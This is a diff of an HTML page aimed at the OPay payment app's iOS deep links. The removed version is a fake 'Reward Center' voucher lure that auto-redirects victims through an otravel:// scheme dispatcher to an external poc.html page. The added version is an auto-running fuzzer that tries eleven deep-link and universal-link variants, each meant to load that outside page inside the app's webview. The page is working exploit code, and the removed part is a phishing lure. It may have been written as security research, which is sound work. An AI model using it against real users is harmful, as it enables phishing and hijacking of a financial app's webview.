@@ -3,25 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OPay Reward Center</title>
+    <title>OPay Deep Link Tester</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #00c853; color: #fff; text-align: center; padding: 50px 20px; }
-        .btn { display: block; background: #fff; color: #00c853; padding: 20px; border-radius: 12px; font-weight: bold; text-decoration: none; font-size: 18px; margin-top: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
-        h1 { font-size: 24px; }
+        body { font-family: -apple-system, sans-serif; background: #222; color: #fff; text-align: center; padding: 20px; }
+        .btn { display: block; background: #00c853; color: #fff; padding: 15px; border-radius: 8px; font-weight: bold; text-decoration: none; margin-top: 10px; font-size: 14px; }
+        .log { background: #000; color: #00c853; padding: 10px; margin-top: 20px; text-align: left; font-family: monospace; font-size: 11px; height: 300px; overflow-y: scroll; border: 1px solid #444; }
+        .active { border: 2px solid yellow; background: #008f3a; }
     </style>
 </head>
 <body>
-    <h1>🎁 Achievement Unlocked!</h1>
-    <p>Tap below to claim your OPay reward vouchers.</p>
-    
-    <!-- This URI uses the confirmed iOS scheme handler -->
-    <a href="otravel://schemedispatcher?scheme=https://zugonwobi.github.io/test/poc.html" class="btn">Claim Reward Now</a>
+    <h3>OPay iOS Deep Link Fuzzer</h3>
+    <div id="status">Ready...</div>
+    <div id="btns"></div>
+    <div class="log" id="log"></div>
 
     <script>
-        // Auto-launch after 2 seconds
-        setTimeout(function() {
-            window.location.href = "otravel://schemedispatcher?scheme=https://zugonwobi.github.io/test/poc.html";
-        }, 2000);
+        var PAYLOAD = "https://zugonwobi.github.io/test/poc.html";
+        var variants = [
+            { name: "1. OTravel:scheme (Confirmed Launch)", url: "otravel://schemedispatcher?scheme=" + encodeURIComponent(PAYLOAD) },
+            { name: "2. OTravel:url (Alt Param)", url: "otravel://schemedispatcher?url=" + encodeURIComponent(PAYLOAD) },
+            { name: "3. OPay:webview (Common Pattern)", url: "opay://webview?url=" + encodeURIComponent(PAYLOAD) },
+            { name: "4. OPay:applink (Common Pattern)", url: "opay://applink?url=" + encodeURIComponent(PAYLOAD) },
+            { name: "5. OPay:web (Short Pattern)", url: "opay://web?url=" + encodeURIComponent(PAYLOAD) },
+            { name: "6. OPayPay:webview", url: "opaypay://webview?url=" + encodeURIComponent(PAYLOAD) },
+            { name: "7. OTravel:webview", url: "otravel://webview?url=" + encodeURIComponent(PAYLOAD) },
+            { name: "8. OTravel:open", url: "otravel://open?url=" + encodeURIComponent(PAYLOAD) },
+            { name: "9. UniLink: mkt.opayweb", url: "https://mkt.opayweb.com/proh5/?link=" + encodeURIComponent(PAYLOAD) },
+            { name: "10. UniLink: m.opayweb", url: "https://m.opayweb.com/webview?url=" + encodeURIComponent(PAYLOAD) },
+            { name: "11. opay-payment:webview", url: "opay-payment://webview?url=" + encodeURIComponent(PAYLOAD) }
+        ];
+
+        var logDiv = document.getElementById("log");
+        var btnDiv = document.getElementById("btns");
+
+        function log(msg) {
+            var d = document.createElement("div");
+            d.innerText = "[" + new Date().toLocaleTimeString() + "] " + msg;
+            logDiv.appendChild(d);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+
+        variants.forEach(function(v, i) {
+            var a = document.createElement("a");
+            a.className = "btn";
+            a.id = "btn-" + i;
+            a.href = v.url;
+            a.innerText = v.name;
+            btnDiv.appendChild(a);
+        });
+
+        var currentIndex = 0;
+        function tryNext() {
+            if (currentIndex >= variants.length) {
+                log("Fuzzing complete.");
+                document.getElementById("status").innerText = "Fuzzing complete.";
+                return;
+            }
+
+            var v = variants[currentIndex];
+            log("Testing " + v.name + "...");
+            document.getElementById("status").innerText = "Testing " + v.name + "...";
+            
+            document.querySelectorAll(".btn").forEach(b => b.classList.remove("active"));
+            var btn = document.getElementById("btn-" + currentIndex);
+            if(btn) btn.classList.add("active");
+
+            window.location.href = v.url;
+
+            currentIndex++;
+            setTimeout(tryNext, 5000); 
+        }
+
+        log("Tap any button to start sequence or manual test.");
+        setTimeout(function() { log("Auto-starting fuzzer..."); tryNext(); }, 3000);
     </script>
 </body>
 </html>
